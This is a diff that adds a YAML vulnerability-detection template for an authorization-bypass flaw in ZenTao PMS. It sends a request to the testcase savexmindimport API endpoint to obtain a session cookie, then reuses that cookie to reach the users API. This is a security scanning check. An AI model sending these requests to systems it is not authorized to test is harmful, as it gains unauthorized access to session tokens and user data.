@@ -1,0 +1,44 @@
+id: zentao-testcase-auth-bypass
+info:
+  name: 禅道 PMS - 越权访问漏洞
+  author: Chaitin
+  severity: medium
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1222946
+    vendor: easycorp
+    product: zentao-pms
+  tags: idor,vuln,zentao
+variables:
+  random_str_0: '{{to_lower(rand_text_alpha(20))}}'
+  random_str_1: '{{to_lower(rand_text_alpha(20))}}'
+flow: http(1) && http(2)
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{random_str_0}}&branch={{random_str_1}}'
+      - '{{BaseURL}}/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{random_str_0}}&branch={{random_str_1}}'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+        internal: true
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        group: 1
+        regex:
+          - 'zentaosid=([a-zA-Z0-9]+)'
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/api.php/v1/users'
+      - '{{BaseURL}}/zentao/api.php/v1/users'
+    headers:
+      Cookie: zentaosid={{cookie}}
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, ''no company-browse priv'')'
